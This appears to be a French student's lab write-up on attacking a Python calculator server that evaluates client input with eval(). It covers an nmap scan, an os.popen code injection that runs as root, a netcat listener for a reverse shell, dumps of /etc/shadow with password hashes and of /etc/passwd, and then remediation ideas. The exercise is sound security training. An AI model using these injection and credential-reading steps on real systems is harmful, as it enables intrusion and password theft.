# TP5 SECU : Exploit, pwn, fix
## 1. Reconnaissance

**🌞 Déterminer**  
- à  quelle IP ce client essaie de se co quand on le lance
```
10.1.1.2
```

- à quel port il essaie de se co sur cette IP
```
13337
```

- vous DEVEZ trouver une autre méthode que la lecture du code pour obtenir ces infos
```
lancer le client et utiliser wireshark pour voir les paquets envoyés
```
**🌞 Scanner le réseau**
```
slayz@debian:~$ nmap -p13337 -sS 10.33.64.0/20 > 13337_scan 
```
[Voir trame wireshark nmap](./tp5_nmap.pcapng)

```
slayz@debian:~$ grep -B5 "open" 13337_scan 

Nmap scan report for 10.33.66.78
Host is up (0.075s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
```

**🌞 Connectez-vous au serveur**
```
l'application est une calculatrice, on peut faire des calculs simples et le serveur nous repond avec le resultat
```

## 2. Exploit

**🌞 Injecter du code serveur**
```
slayz@debian:~$ nc 10.33.66.78 13337
__import__('os').popen('whoami').read()
'root'
```

## 3. Reverse shell


**🌞 Obtenez un reverse shell sur le serveur**

*Attaquant*
```
slayz@debian:~$ nc -lvp 9999
listening on [any] 9999 ...
```
*Victime*  
[voir le code du client modifié avec le reverse shell](./client_updated.py)

**🌞 Pwn**

```
[root@localhost /]# cat /etc/shadow
cat /etc/shadow
root:$6$.8fzl//9C0M819BS$Sw1mrG49Md8cyNUn0Ai0vlthhzuSZpJ/XVfersVmgXDSBrTVchneIWHYHnT3mC/NutmPS03TneWAHihO0NXrj1::0:99999:7:::
bin:*:19820:0:99999:7:::
daemon:*:19820:0:99999:7:::
adm:*:19820:0:99999:7:::
lp:*:19820:0:99999:7:::
sync:*:19820:0:99999:7:::
shutdown:*:19820:0:99999:7:::
halt:*:19820:0:99999:7:::
mail:*:19820:0:99999:7:::
operator:*:19820:0:99999:7:::
games:*:19820:0:99999:7:::
ftp:*:19820:0:99999:7:::
nobody:*:19820:0:99999:7:::
systemd-coredump:!!:20010::::::
dbus:!!:20010::::::
tss:!!:20010::::::
sssd:!!:20010::::::
sshd:!!:20010::::::
chrony:!!:20010::::::
it4:$6$HTSBHGoZflJxXu9u$i54higNbS5p2zVOLWP6P33D39SyWRrEAOjzh97xRa15KzJU3jZfBi/XIPY3FKDoYoSvo1FrirBwNcgmEVpaPK/::0:99999:7:::
tcpdump:!!:20010::::::
```

```
[root@localhost /]# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
sssd:x:998:996:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
```

```
[root@localhost /]# ss -alntupe
ss -alntupe
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                           
udp   UNCONN 0      0          127.0.0.1:323        0.0.0.0:*    users:(("chronyd",pid=664,fd=5)) ino:19450 sk:1 cgroup:/system.slice/chronyd.service <->         
udp   UNCONN 0      0              [::1]:323           [::]:*    users:(("chronyd",pid=664,fd=6)) ino:19451 sk:2 cgroup:/system.slice/chronyd.service v6only:1 <->
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=701,fd=3)) ino:20005 sk:3 cgroup:/system.slice/sshd.service <->               
tcp   LISTEN 2      1            0.0.0.0:13337      0.0.0.0:*    users:(("python3",pid=1270,fd=3)) ino:21759 sk:4 cgroup:/system.slice/calc.service <->           
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=701,fd=4)) ino:20017 sk:5 cgroup:/system.slice/sshd.service v6only:1 <->      
[root@localhost /]# systemctl status calc.service
systemctl status calc.service
● calc.service - calc service
     Loaded: loaded (/etc/systemd/system/calc.service; enabled; preset: disabled)
     Active: active (running) since Thu 2024-10-24 11:33:03 CEST; 8min ago
   Main PID: 1270 (python3)
      Tasks: 4 (limit: 11100)
     Memory: 7.1M
        CPU: 220ms
     CGroup: /system.slice/calc.service
             ├─1270 /usr/bin/python3 /opt/calc/server.py
             ├─1280 bash -i
             └─1358 systemctl status calc.service

Oct 24 11:33:03 localhost.localdomain systemd[1]: Started calc service.
[root@localhost /]# cat /opt/calc/server.py
cat /opt/calc/server.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 13337))  

s.listen(1)
conn, addr = s.accept()

while True:

    try:
        # On reçoit la string Hello du client
        data = conn.recv(1024)
        if not data: break
        print(f"Données reçues du client : {data}")

        conn.send("Hello".encode())

        # On reçoit le calcul du client
        data = conn.recv(1024)
        data = data.decode().strip("\n")

        # Evaluation et envoi du résultat
        res  = eval(data)
        conn.send(str(res).encode())
         
    except socket.error:
        print("Error Occured.")
        break

conn.close()
```

```[root@localhost /]# systemctl list-units --type=service --state=running
systemctl list-units --type=service --state=running
  UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
  auditd.service           loaded active running Security Auditing Service
  calc.service             loaded active running calc service
  chronyd.service          loaded active running NTP client/server
  crond.service            loaded active running Command Scheduler
  dbus-broker.service      loaded active running D-Bus System Message Bus
  firewalld.service        loaded active running firewalld - dynamic firewall daemon
  getty@tty1.service       loaded active running Getty on tty1
  NetworkManager.service   loaded active running Network Manager
  rsyslog.service          loaded active running System Logging Service
  sshd.service             loaded active running OpenSSH server daemon
  systemd-journald.service loaded active running Journal Service
  systemd-logind.service   loaded active running User Login Management
  systemd-udevd.service    loaded active running Rule-based Manager for Device Events and Files
  user@1000.service        loaded active running User Manager for UID 1000

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
14 loaded units listed
```
## II. Remédiation

**🌞 Proposer une remédiation dév**
```
reg ex

comment empecher un programme de lancer bash


eval() est dangereux, utiliser un autre moyen pour evaluer les calculs

```

**🌞 Proposer une remédiation système**

```
useradd -r -s /sbin/nologin calcuser
chown calcuser:calcuser /opt/calc/server.py
chmod 750 /opt/calc/server.py

[Unit]
Description=calc service

[Service]
User=calcuser
Group=calcuser
Restart=always
ExecStart=/usr/bin/python3 /opt/calc/server.py

[Install]SystemCallFilter =~ fork
WantedBy=multi-user.target
```


```
firewall pour bloquer les connexions sortante sur le port 13337
```
```
syscall pour empecher l'execution de commande style ls ou cat
executer des services dans un environnement isolé donc dans des conteneurs
```
